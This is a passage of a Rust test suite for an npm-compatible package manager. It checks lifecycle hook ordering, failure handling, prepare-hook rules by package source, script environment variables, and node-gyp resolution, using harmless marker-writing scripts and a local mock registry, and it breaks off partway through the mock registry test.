    let marker_file = root.join("hook_order.txt");
    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");

    let pkg_a_dir = root.join("packages").join("pkg-a");
    let pkg_b_dir = root.join("packages").join("pkg-b");
    std::fs::create_dir_all(&pkg_a_dir).unwrap();
    std::fs::create_dir_all(&pkg_b_dir).unwrap();

    let mut manifest_a = Manifest::default();
    manifest_a.name = Some("pkg-a".to_string());
    manifest_a.version = Some("1.0.0".to_string());
    manifest_a.scripts.insert(
        "prebuild".to_string(),
        format!(
            "node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-a:prebuild\\n')\""
        ),
    );
    manifest_a.scripts.insert(
        "build".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-a:build\\n')\""),
    );
    manifest_a.scripts.insert(
        "postbuild".to_string(),
        format!(
            "node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-a:postbuild\\n')\""
        ),
    );

    let mut manifest_b = Manifest::default();
    manifest_b.name = Some("pkg-b".to_string());
    manifest_b.version = Some("1.0.0".to_string());
    manifest_b
        .dependencies
        .insert("pkg-a".to_string(), "1.0.0".to_string());
    manifest_b.scripts.insert(
        "prebuild".to_string(),
        format!(
            "node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-b:prebuild\\n')\""
        ),
    );
    manifest_b.scripts.insert(
        "build".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-b:build\\n')\""),
    );
    manifest_b.scripts.insert(
        "postbuild".to_string(),
        format!(
            "node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-b:postbuild\\n')\""
        ),
    );

    let members = vec![
        WorkspaceScriptMember {
            name: "pkg-b".to_string(),
            path: pkg_b_dir,
            manifest: manifest_b,
        },
        WorkspaceScriptMember {
            name: "pkg-a".to_string(),
            path: pkg_a_dir,
            manifest: manifest_a,
        },
    ];

    let opts = WorkspaceRunOptions {
        script: "build".to_string(),
        args: vec![],
        ignore_scripts: false,
        foreground_scripts: false,
        strict_sandbox: false,
        if_present: false,
        filter_members: None,
    };

    let summary = execute_workspace_scripts_topological(root, &members, &[], &opts)
        .await
        .expect("Workspace build execution must succeed");

    assert_eq!(summary.executed_packages, vec!["pkg-a", "pkg-b"]);

    let content = std::fs::read_to_string(&marker_file).unwrap();
    let lines: Vec<&str> = content.lines().collect();
    assert_eq!(
        lines,
        vec![
            "pkg-a:prebuild",
            "pkg-a:build",
            "pkg-a:postbuild",
            "pkg-b:prebuild",
            "pkg-b:build",
            "pkg-b:postbuild",
        ]
    );
}

#[tokio::test]
async fn test_workspace_script_pre_hook_failure_halts_execution() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let marker_file = root.join("pre_fail_marker.txt");
    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");

    let pkg_1_dir = root.join("packages").join("pkg-1");
    let pkg_2_dir = root.join("packages").join("pkg-2");
    std::fs::create_dir_all(&pkg_1_dir).unwrap();
    std::fs::create_dir_all(&pkg_2_dir).unwrap();

    let mut manifest_1 = Manifest::default();
    manifest_1.name = Some("pkg-1".to_string());
    manifest_1.version = Some("1.0.0".to_string());
    manifest_1.scripts.insert(
        "pretest".to_string(),
        "node -e \"process.exit(42)\"".to_string(),
    );
    manifest_1.scripts.insert(
        "test".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-1:test\\n')\""),
    );
    manifest_1.scripts.insert(
        "posttest".to_string(),
        format!(
            "node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-1:posttest\\n')\""
        ),
    );

    let mut manifest_2 = Manifest::default();
    manifest_2.name = Some("pkg-2".to_string());
    manifest_2.version = Some("1.0.0".to_string());
    manifest_2.scripts.insert(
        "test".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-2:test\\n')\""),
    );

    let members = vec![
        WorkspaceScriptMember {
            name: "pkg-1".to_string(),
            path: pkg_1_dir,
            manifest: manifest_1,
        },
        WorkspaceScriptMember {
            name: "pkg-2".to_string(),
            path: pkg_2_dir,
            manifest: manifest_2,
        },
    ];

    let opts = WorkspaceRunOptions {
        script: "test".to_string(),
        args: vec![],
        ignore_scripts: false,
        foreground_scripts: false,
        strict_sandbox: false,
        if_present: false,
        filter_members: None,
    };

    let res = execute_workspace_scripts_topological(
        root,
        &members,
        &["pkg-1".to_string(), "pkg-2".to_string()],
        &opts,
    )
    .await;
    assert!(res.is_err(), "Execution must fail when pre-hook fails");

    let err = res.unwrap_err();
    let exit_code = extract_error_exit_code(&err);
    assert_eq!(exit_code, 42, "Exit code must match the failed pre-hook");

    assert!(
        !marker_file.exists(),
        "No downstream scripts should have executed after pre-hook failure"
    );
}

#[tokio::test]
async fn test_workspace_script_main_failure_prevents_post_hook() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let marker_file = root.join("main_fail_marker.txt");
    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");

    let pkg_dir = root.join("packages").join("pkg-main-fail");
    std::fs::create_dir_all(&pkg_dir).unwrap();

    let mut manifest = Manifest::default();
    manifest.name = Some("pkg-main-fail".to_string());
    manifest.version = Some("1.0.0".to_string());
    manifest.scripts.insert(
        "prebuild".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'prebuild\\n')\""),
    );
    manifest.scripts.insert(
        "build".to_string(),
        "node -e \"process.exit(17)\"".to_string(),
    );
    manifest.scripts.insert(
        "postbuild".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'postbuild\\n')\""),
    );

    let members = vec![WorkspaceScriptMember {
        name: "pkg-main-fail".to_string(),
        path: pkg_dir,
        manifest,
    }];

    let opts = WorkspaceRunOptions {
        script: "build".to_string(),
        args: vec![],
        ignore_scripts: false,
        foreground_scripts: false,
        strict_sandbox: false,
        if_present: false,
        filter_members: None,
    };

    let res = execute_workspace_scripts_topological(root, &members, &[], &opts).await;
    assert!(res.is_err(), "Execution must fail when main script fails");

    let err = res.unwrap_err();
    let exit_code = extract_error_exit_code(&err);
    assert_eq!(exit_code, 17, "Exit code must match the failed main script");

    let content = std::fs::read_to_string(&marker_file).unwrap();
    let lines: Vec<&str> = content.lines().collect();
    assert_eq!(
        lines,
        vec!["prebuild"],
        "Only prebuild should run before failure; postbuild must be skipped"
    );
}

#[tokio::test]
async fn test_package_source_prepare_hook_behavior() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let marker_file = root.join("prepare_hooks.txt");
    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");

    let sources = [
        ("registry-dep", PackageSource::Registry, false),
        ("local-dep", PackageSource::Local, true),
        ("git-dep", PackageSource::Git, true),
        ("tarball-dep", PackageSource::LocalTarball, true),
    ];

    let mut nodes = Vec::new();
    for (name, source, _should_run_prepare) in &sources {
        let pkg_dir = root.join("node_modules").join(name);
        std::fs::create_dir_all(&pkg_dir).unwrap();

        let mut manifest = Manifest::default();
        manifest.name = Some(name.to_string());
        manifest.version = Some("1.0.0".to_string());
        manifest.scripts.insert(
            "prepare".to_string(),
            format!(
                "node -e \"require('fs').appendFileSync('{escaped_marker}', '{name}:prepare\\n')\""
            ),
        );

        nodes.push(LifecyclePackageNode {
            package_path: format!("node_modules/{name}"),
            disk_path: pkg_dir,
            manifest,
            source: *source,
            dependencies: vec![],
            optional: false,
        });
    }

    let root_manifest = Manifest::default();
    let opts = LifecycleOptions::new(root);

    let res = execute_topological(&nodes, &root_manifest, &opts).await;
    assert!(
        res.is_ok(),
        "Lifecycle topological execution should succeed"
    );

    let marker_content = if marker_file.exists() {
        std::fs::read_to_string(&marker_file).unwrap()
    } else {
        String::new()
    };
    let ran_lines: Vec<&str> = marker_content.lines().collect();

    // Registry dep should NOT run prepare
    assert!(
        !ran_lines.contains(&"registry-dep:prepare"),
        "Registry dependency MUST NOT run prepare"
    );

    // Local, Git, LocalTarball MUST run prepare
    assert!(
        ran_lines.contains(&"local-dep:prepare"),
        "Local dependency MUST run prepare"
    );
    assert!(
        ran_lines.contains(&"git-dep:prepare"),
        "Git dependency MUST run prepare"
    );
    assert!(
        ran_lines.contains(&"tarball-dep:prepare"),
        "LocalTarball dependency MUST run prepare"
    );
}

#[tokio::test]
async fn test_workspace_script_missing_hooks_safely_skipped() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let marker_file = root.join("missing_hooks_marker.txt");
    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");

    let p1_dir = root.join("packages").join("pkg-only-main");
    std::fs::create_dir_all(&p1_dir).unwrap();
    let mut m1 = Manifest::default();
    m1.name = Some("pkg-only-main".to_string());
    m1.scripts.insert(
        "compile".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-only-main:compile\\n')\""),
    );

    let p2_dir = root.join("packages").join("pkg-pre-post");
    std::fs::create_dir_all(&p2_dir).unwrap();
    let mut m2 = Manifest::default();
    m2.name = Some("pkg-pre-post".to_string());
    m2.scripts.insert(
        "precompile".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-pre-post:precompile\\n')\""),
    );
    m2.scripts.insert(
        "postcompile".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-pre-post:postcompile\\n')\""),
    );

    let p3_dir = root.join("packages").join("pkg-only-post");
    std::fs::create_dir_all(&p3_dir).unwrap();
    let mut m3 = Manifest::default();
    m3.name = Some("pkg-only-post".to_string());
    m3.scripts.insert(
        "postcompile".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-only-post:postcompile\\n')\""),
    );

    let p4_dir = root.join("packages").join("pkg-none");
    std::fs::create_dir_all(&p4_dir).unwrap();
    let mut m4 = Manifest::default();
    m4.name = Some("pkg-none".to_string());
    m4.scripts
        .insert("unrelated".to_string(), "echo nothing".to_string());

    let members = vec![
        WorkspaceScriptMember {
            name: "pkg-only-main".to_string(),
            path: p1_dir,
            manifest: m1,
        },
        WorkspaceScriptMember {
            name: "pkg-pre-post".to_string(),
            path: p2_dir,
            manifest: m2,
        },
        WorkspaceScriptMember {
            name: "pkg-only-post".to_string(),
            path: p3_dir,
            manifest: m3,
        },
        WorkspaceScriptMember {
            name: "pkg-none".to_string(),
            path: p4_dir,
            manifest: m4,
        },
    ];

    let order = vec![
        "pkg-only-main".to_string(),
        "pkg-pre-post".to_string(),
        "pkg-only-post".to_string(),
        "pkg-none".to_string(),
    ];

    let opts = WorkspaceRunOptions {
        script: "compile".to_string(),
        args: vec![],
        ignore_scripts: false,
        foreground_scripts: false,
        strict_sandbox: false,
        if_present: true,
        filter_members: None,
    };

    let summary = execute_workspace_scripts_topological(root, &members, &order, &opts)
        .await
        .expect("Execution must succeed with skipped missing hooks");

    assert_eq!(
        summary.executed_packages,
        vec!["pkg-only-main", "pkg-pre-post", "pkg-only-post"]
    );
    assert_eq!(summary.skipped_packages, vec!["pkg-none"]);

    let content = std::fs::read_to_string(&marker_file).unwrap();
    let lines: Vec<&str> = content.lines().collect();
    assert_eq!(
        lines,
        vec![
            "pkg-only-main:compile",
            "pkg-pre-post:precompile",
            "pkg-pre-post:postcompile",
            "pkg-only-post:postcompile",
        ]
    );
}

#[tokio::test]
async fn test_workspace_topological_order_execution_dependencies_before_dependents() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let marker_file = root.join("topo_dep_order.txt");
    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");

    let mut m_core = Manifest::default();
    m_core.name = Some("core-db".to_string());
    m_core.scripts.insert(
        "build".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'core-db\\n')\""),
    );

    let mut m_auth = Manifest::default();
    m_auth.name = Some("auth-service".to_string());
    m_auth
        .dependencies
        .insert("core-db".to_string(), "workspace:*".to_string());
    m_auth.scripts.insert(
        "build".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'auth-service\\n')\""),
    );

    let mut m_gw = Manifest::default();
    m_gw.name = Some("api-gateway".to_string());
    m_gw.dependencies
        .insert("auth-service".to_string(), "workspace:*".to_string());
    m_gw.dev_dependencies
        .insert("core-db".to_string(), "workspace:*".to_string());
    m_gw.scripts.insert(
        "build".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'api-gateway\\n')\""),
    );

    let mut m_front = Manifest::default();
    m_front.name = Some("frontend-app".to_string());
    m_front
        .dependencies
        .insert("api-gateway".to_string(), "workspace:*".to_string());
    m_front.scripts.insert(
        "build".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'frontend-app\\n')\""),
    );

    let members = vec![
        WorkspaceScriptMember {
            name: "frontend-app".to_string(),
            path: root.join("packages/frontend-app"),
            manifest: m_front,
        },
        WorkspaceScriptMember {
            name: "api-gateway".to_string(),
            path: root.join("packages/api-gateway"),
            manifest: m_gw,
        },
        WorkspaceScriptMember {
            name: "auth-service".to_string(),
            path: root.join("packages/auth-service"),
            manifest: m_auth,
        },
        WorkspaceScriptMember {
            name: "core-db".to_string(),
            path: root.join("packages/core-db"),
            manifest: m_core,
        },
    ];

    for m in &members {
        std::fs::create_dir_all(&m.path).unwrap();
    }

    let opts = WorkspaceRunOptions {
        script: "build".to_string(),
        args: vec![],
        ignore_scripts: false,
        foreground_scripts: false,
        strict_sandbox: false,
        if_present: false,
        filter_members: None,
    };

    let summary = execute_workspace_scripts_topological(root, &members, &[], &opts)
        .await
        .expect("Workspace topological execution must succeed");

    assert_eq!(
        summary.executed_packages,
        vec!["core-db", "auth-service", "api-gateway", "frontend-app"]
    );

    let content = std::fs::read_to_string(&marker_file).unwrap();
    let lines: Vec<&str> = content.lines().collect();
    assert_eq!(
        lines,
        vec!["core-db", "auth-service", "api-gateway", "frontend-app"],
        "Dependencies must execute before dependents regardless of initial member order"
    );
}

#[test]
fn test_npm_package_environment_variables_flattening() {
    let temp = tempfile::tempdir().unwrap();
    let pkg_dir = temp.path().join("my-test-pkg");
    std::fs::create_dir_all(&pkg_dir).unwrap();

    let pkg_json = pkg_dir.join("package.json");
    std::fs::write(
        &pkg_json,
        r#"{
  "name": "my-test-pkg",
  "version": "2.4.1",
  "description": "A package for testing lifecycle envs",
  "config": {
    "port": 8080,
    "active": true
  },
  "keywords": ["fast", "rust", "npm"],
  "scripts": {
    "build": "echo building"
  }
}"#,
    )
    .unwrap();

    let ctx = LifecycleContext::new(
        temp.path(),
        &pkg_dir,
        "my-test-pkg",
        "build",
        "echo building",
    );
    let env = build_lifecycle_env(&ctx);

    assert_eq!(
        env.get("npm_package_name").map(|s| s.as_str()),
        Some("my-test-pkg")
    );
    assert_eq!(
        env.get("npm_package_version").map(|s| s.as_str()),
        Some("2.4.1")
    );
    assert_eq!(
        env.get("npm_package_description").map(|s| s.as_str()),
        Some("A package for testing lifecycle envs")
    );
    assert_eq!(
        env.get("npm_package_config_port").map(|s| s.as_str()),
        Some("8080")
    );
    assert_eq!(
        env.get("npm_package_config_active").map(|s| s.as_str()),
        Some("true")
    );
    assert_eq!(
        env.get("npm_package_keywords_0").map(|s| s.as_str()),
        Some("fast")
    );
    assert_eq!(
        env.get("npm_package_keywords_1").map(|s| s.as_str()),
        Some("rust")
    );
    assert_eq!(
        env.get("npm_package_keywords_2").map(|s| s.as_str()),
        Some("npm")
    );
    assert_eq!(
        env.get("npm_package_scripts_build").map(|s| s.as_str()),
        Some("echo building")
    );
}

#[test]
fn test_script_shell_context_populated_from_npmrc() {
    let temp = tempfile::tempdir().unwrap();
    std::fs::write(temp.path().join(".npmrc"), "script-shell = /bin/bash\n").unwrap();

    let ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    assert_eq!(ctx.script_shell.as_deref(), Some("/bin/bash"));
}

#[test]
fn test_script_shell_null_or_empty_ignored() {
    let temp = tempfile::tempdir().unwrap();
    std::fs::write(temp.path().join(".npmrc"), "script-shell = null\n").unwrap();

    let ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    assert_eq!(ctx.script_shell, None);

    let temp2 = tempfile::tempdir().unwrap();
    std::fs::write(temp2.path().join(".npmrc"), "script-shell = \"\"\n").unwrap();

    let ctx2 = LifecycleContext::new(
        temp2.path(),
        temp2.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    assert_eq!(ctx2.script_shell, None);
}

#[test]
fn test_is_cmd_shell_variants() {
    assert!(is_cmd_shell("cmd"));
    assert!(is_cmd_shell("cmd.exe"));
    assert!(is_cmd_shell("CMD.EXE"));
    assert!(is_cmd_shell(r"C:\Windows\System32\cmd.exe"));
    assert!(is_cmd_shell(r#""C:\Windows\System32\cmd.exe""#));
    assert!(!is_cmd_shell("cmd.bat"));
    assert!(!is_cmd_shell("/bin/sh"));
    assert!(!is_cmd_shell("bash"));
    assert!(!is_cmd_shell("powershell"));
    assert!(!is_cmd_shell("true"));
}

#[test]
fn test_script_shell_execution_sync() {
    let temp = tempfile::tempdir().unwrap();
    let shell = if cfg!(windows) { "cmd.exe" } else { "/bin/sh" };
    let mut ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "node -e \"process.exit(0)\"",
    );
    ctx.script_shell = Some(shell.to_string());
    let status = execute_lifecycle_script(&ctx).unwrap();
    assert!(status.success());
}

#[test]
fn test_script_shell_nonexistent_fails() {
    let temp = tempfile::tempdir().unwrap();
    let mut ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    ctx.script_shell = Some("nonexistent_shell_binary_98765".to_string());
    let res = execute_lifecycle_script(&ctx);
    assert!(res.is_err(), "Spawning nonexistent shell must fail");
}

#[test]
fn test_node_options_injected_when_empty() {
    let temp = tempfile::tempdir().unwrap();
    let mut ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    ctx.extra_env.insert(
        "npm_config_node_options".to_string(),
        "--max-old-space-size=4096".to_string(),
    );
    let env = build_lifecycle_env(&ctx);
    assert_eq!(
        env.get("NODE_OPTIONS").map(|s| s.as_str()),
        Some("--max-old-space-size=4096")
    );
}

#[test]
fn test_node_options_appended_when_existing() {
    let temp = tempfile::tempdir().unwrap();
    let mut ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    ctx.extra_env.insert(
        "NODE_OPTIONS".to_string(),
        "--trace-warnings".to_string(),
    );
    ctx.extra_env.insert(
        "npm_config_node_options".to_string(),
        "--max-old-space-size=4096".to_string(),
    );
    let env = build_lifecycle_env(&ctx);
    assert_eq!(
        env.get("NODE_OPTIONS").map(|s| s.as_str()),
        Some("--trace-warnings --max-old-space-size=4096")
    );
}

#[test]
fn test_node_options_ignored_when_null_or_empty() {
    let temp = tempfile::tempdir().unwrap();
    let mut ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    ctx.extra_env.insert(
        "npm_config_node_options".to_string(),
        "null".to_string(),
    );
    let env = build_lifecycle_env(&ctx);
    assert_eq!(env.get("NODE_OPTIONS"), None);

    let mut ctx2 = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    ctx2.extra_env.insert(
        "npm_config_node_options".to_string(),
        "".to_string(),
    );
    let env2 = build_lifecycle_env(&ctx2);
    assert_eq!(env2.get("NODE_OPTIONS"), None);
}

#[test]
fn test_node_env_production_set_when_omit_dev() {
    let temp = tempfile::tempdir().unwrap();
    let mut ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    ctx.extra_env.insert(
        "npm_config_omit".to_string(),
        "dev".to_string(),
    );
    let env = build_lifecycle_env(&ctx);
    assert_eq!(
        env.get("NODE_ENV").map(|s| s.as_str()),
        Some("production")
    );
}

#[test]
fn test_node_env_production_set_when_production_flag() {
    let temp = tempfile::tempdir().unwrap();
    let mut ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    ctx.extra_env.insert(
        "npm_config_production".to_string(),
        "true".to_string(),
    );
    let env = build_lifecycle_env(&ctx);
    assert_eq!(
        env.get("NODE_ENV").map(|s| s.as_str()),
        Some("production")
    );
}

#[test]
fn test_node_env_not_overwritten_if_already_set() {
    let temp = tempfile::tempdir().unwrap();
    let mut ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    ctx.extra_env.insert(
        "NODE_ENV".to_string(),
        "development".to_string(),
    );
    ctx.extra_env.insert(
        "npm_config_omit".to_string(),
        "dev".to_string(),
    );
    let env = build_lifecycle_env(&ctx);
    assert_eq!(
        env.get("NODE_ENV").map(|s| s.as_str()),
        Some("development")
    );
}

#[test]
fn test_node_env_not_set_for_other_omit() {
    let temp = tempfile::tempdir().unwrap();
    let mut ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    ctx.extra_env.insert(
        "npm_config_omit".to_string(),
        "optional".to_string(),
    );
    let env = build_lifecycle_env(&ctx);
    assert_ne!(
        env.get("NODE_ENV").map(|s| s.as_str()),
        Some("production")
    );
}

#[test]
fn test_node_env_not_set_when_include_dev_overrides() {
    let temp = tempfile::tempdir().unwrap();
    let mut ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "echo 1",
    );
    ctx.extra_env.insert(
        "npm_config_omit".to_string(),
        "dev".to_string(),
    );
    ctx.extra_env.insert(
        "npm_config_include".to_string(),
        "dev".to_string(),
    );
    let env = build_lifecycle_env(&ctx);
    assert_ne!(
        env.get("NODE_ENV").map(|s| s.as_str()),
        Some("production")
    );
}

#[test]
fn test_node_gyp_explicit_config_precedence() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path().join("proj");
    std::fs::create_dir_all(&root).unwrap();

    // 1. Setup local project node_modules/.bin/node-gyp and node_modules/node-gyp/bin/node-gyp.js
    let local_bin = root.join("node_modules").join(".bin");
    std::fs::create_dir_all(&local_bin).unwrap();
    let local_sh = local_bin.join("node-gyp");
    std::fs::write(&local_sh, "#!/bin/sh\nexit 0\n").unwrap();

    let local_js_dir = root.join("node_modules").join("node-gyp").join("bin");
    std::fs::create_dir_all(&local_js_dir).unwrap();
    let local_js = local_js_dir.join("node-gyp.js");
    std::fs::write(&local_js, "console.log('local');").unwrap();

    // 2. Setup cached standalone node-gyp
    let cache_dir = temp.path().join("cache");
    let cached_js_dir = cache_dir.join("node-gyp").join("current").join("bin");
    std::fs::create_dir_all(&cached_js_dir).unwrap();
    let cached_js = cached_js_dir.join("node-gyp.js");
    std::fs::write(&cached_js, "console.log('cached');").unwrap();

    let mut config = rnpm_config::Config::default();
    config.npmrc.settings.insert(
        "cache".to_string(),
        cache_dir.to_string_lossy().to_string(),
    );

    // Verify without explicit override, local project node_modules takes precedence
    let local_resolved = find_node_gyp(&root, &root, &config, None).unwrap();
    assert!(
        local_resolved == local_sh || local_resolved == local_js || local_resolved.starts_with(&root),
        "Local node-gyp must take precedence over cache when no explicit config is set: {}",
        local_resolved.display()
    );

    // 3. Explicit config override (explicit option) takes precedence over EVERYTHING
    let explicit_path = temp.path().join("custom-gyp").join("node-gyp.js");
    let resolved_explicit = find_node_gyp(&root, &root, &config, Some(&explicit_path)).unwrap();
    assert_eq!(
        resolved_explicit, explicit_path,
        "Explicit option must override local and cached node-gyp"
    );

    // 4. Explicit config via .npmrc (node-gyp = <path>) takes precedence over local & cached
    let rc_path = temp.path().join("rc-custom-gyp").join("node-gyp.js");
    let mut config_rc = config.clone();
    config_rc.npmrc.settings.insert(
        "node-gyp".to_string(),
        rc_path.to_string_lossy().to_string(),
    );
    let resolved_rc = find_node_gyp(&root, &root, &config_rc, None).unwrap();
    assert_eq!(
        resolved_rc, rc_path,
        ".npmrc node-gyp setting must override local and cached node-gyp"
    );

    // 5. Verify LifecycleOptions and LifecycleContext wiring
    let ctx = LifecycleContext::new(&root, &root, "test-native", "install", "node-gyp rebuild")
        .with_node_gyp(&explicit_path);
    let env = build_lifecycle_env(&ctx);
    assert_eq!(
        env.get("npm_config_node_gyp").map(|s| s.as_str()),
        Some(explicit_path.to_str().unwrap()),
        "npm_config_node_gyp must match the explicit override"
    );
}

#[test]
fn test_node_gyp_cached_standalone_without_npm() {
    let temp = tempfile::tempdir().unwrap();
    let project_dir = temp.path().join("pkg");
    std::fs::create_dir_all(&project_dir).unwrap();

    // Write binding.gyp to indicate a native package
    std::fs::write(project_dir.join("binding.gyp"), "{}").unwrap();
    std::fs::write(
        project_dir.join("package.json"),
        r#"{"name": "native-test-pkg", "version": "1.0.0"}"#,
    )
    .unwrap();

    // Create standalone cached node-gyp in <cache>/node-gyp/current/bin/node-gyp.js
    let cache_dir = temp.path().join("cache");
    let cached_bin = cache_dir.join("node-gyp").join("current").join("bin");
    std::fs::create_dir_all(&cached_bin).unwrap();
    let marker_file = project_dir.join("cached-build.marker");
    let marker_escaped = marker_file.to_string_lossy().replace('\\', "/");
    let node_gyp_content = format!(
        "const fs = require('fs'); fs.writeFileSync('{}', 'cached node-gyp executed'); process.exit(0);",
        marker_escaped
    );
    std::fs::write(cached_bin.join("node-gyp.js"), &node_gyp_content).unwrap();

    let mut ctx = LifecycleContext::new(
        &project_dir,
        &project_dir,
        "native-test-pkg",
        "install",
        "node-gyp rebuild",
    );
    ctx.extra_env.insert(
        "npm_config_cache".to_string(),
        cache_dir.to_string_lossy().to_string(),
    );
    ctx.extra_env.insert(
        "npm_config_node_gyp_fallback_npm".to_string(),
        "false".to_string(),
    );

    let status = execute_lifecycle_script(&ctx).expect("Execution with standalone cached node-gyp must succeed");
    assert!(status.success(), "Lifecycle script must exit successfully");
    assert!(
        marker_file.is_file(),
        "Cached standalone node-gyp.js must be executed and create marker file"
    );
    let content = std::fs::read_to_string(&marker_file).unwrap();
    assert_eq!(content, "cached node-gyp executed");
}

#[test]
fn test_node_gyp_offline_error_when_absent() {
    let temp = tempfile::tempdir().unwrap();
    let project_dir = temp.path().join("pkg");
    std::fs::create_dir_all(&project_dir).unwrap();

    std::fs::write(project_dir.join("binding.gyp"), "{}").unwrap();
    std::fs::write(
        project_dir.join("package.json"),
        r#"{"name": "offline-native-pkg", "version": "1.0.0"}"#,
    )
    .unwrap();

    // Point cache to an empty directory
    let empty_cache = temp.path().join("empty_cache");
    std::fs::create_dir_all(&empty_cache).unwrap();

    let mut config = rnpm_config::Config::default();
    config.npmrc.settings.insert(
        "cache".to_string(),
        empty_cache.to_string_lossy().to_string(),
    );
    config.npmrc.settings.insert(
        "node-gyp-fallback-npm".to_string(),
        "false".to_string(),
    );

    // Call ensure_node_gyp in offline mode
    let err = ensure_node_gyp(
        &project_dir,
        &project_dir,
        &config,
        None,
        true, // offline = true
        "offline-native-pkg",
    )
    .expect_err("ensure_node_gyp must fail in offline mode when node-gyp is absent");

    let err_str = err.to_string();
    assert!(
        err_str.contains("offline-native-pkg"),
        "Error message must name the affected package: {err_str}"
    );
    assert!(
        err_str.contains("offline mode") || err_str.contains("In offline mode"),
        "Error message must mention offline mode: {err_str}"
    );
    assert!(
        err_str.contains("npm_config_node_gyp") || err_str.contains(".npmrc") || err_str.contains("node-gyp=<path>"),
        "Error message must provide actionable instructions on how to configure node-gyp: {err_str}"
    );
}

fn create_mock_node_gyp_tarball(marker_file: &str, marker_content: &str) -> Vec<u8> {
    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    {
        let mut builder = tar::Builder::new(&mut gz);

        // package/package.json
        let pkg_json = r#"{"name":"node-gyp","version":"10.0.0","bin":{"node-gyp":"bin/node-gyp.js"}}"#;
        let mut header = tar::Header::new_gnu();
        header.set_path("package/package.json").unwrap();
        header.set_size(pkg_json.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        builder.append(&header, pkg_json.as_bytes()).unwrap();

        // package/bin/node-gyp.js
        let js_script = format!(
            "const fs = require('fs'); fs.writeFileSync('{}', '{}'); process.exit(0);",
            marker_file.replace('\\', "/"),
            marker_content
        );
        let mut header_js = tar::Header::new_gnu();
        header_js.set_path("package/bin/node-gyp.js").unwrap();
        header_js.set_size(js_script.len() as u64);
        header_js.set_mode(0o755);
        header_js.set_cksum();
        builder.append(&header_js, js_script.as_bytes()).unwrap();

        builder.finish().unwrap();
    }
    gz.finish().unwrap()
}

#[test]
fn test_node_gyp_mock_registry_on_demand_bootstrap() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    let temp = tempfile::tempdir().unwrap();
    let project_dir = temp.path().join("pkg");
    std::fs::create_dir_all(&project_dir).unwrap();

    let marker_file = project_dir.join("bootstrap-build.marker");
    let marker_escaped = marker_file.to_string_lossy().replace('\\', "/");
    let tarball_bytes = create_mock_node_gyp_tarball(&marker_escaped, "bootstrap node-gyp built package");
    let integrity = rnpm_core::Integrity::from_bytes(&tarball_bytes, rnpm_core::Algorithm::Sha512).to_string();

    // Start mock HTTP registry server
    let listener = TcpListener::bind("127.0.0.1:0").expect("Failed to bind mock registry listener");
    let port = listener.local_addr().unwrap().port();
    let tb_clone = tarball_bytes.clone();
    let integrity_clone = integrity.clone();

    let server_handle = std::thread::spawn(move || {
        for mut stream in listener.incoming().flatten() {
            let mut buf = [0u8; 4096];
            let n = stream.read(&mut buf).unwrap_or(0);
            let req = String::from_utf8_lossy(&buf[..n]);
            if req.contains("GET /node-gyp") {
                let body = format!(
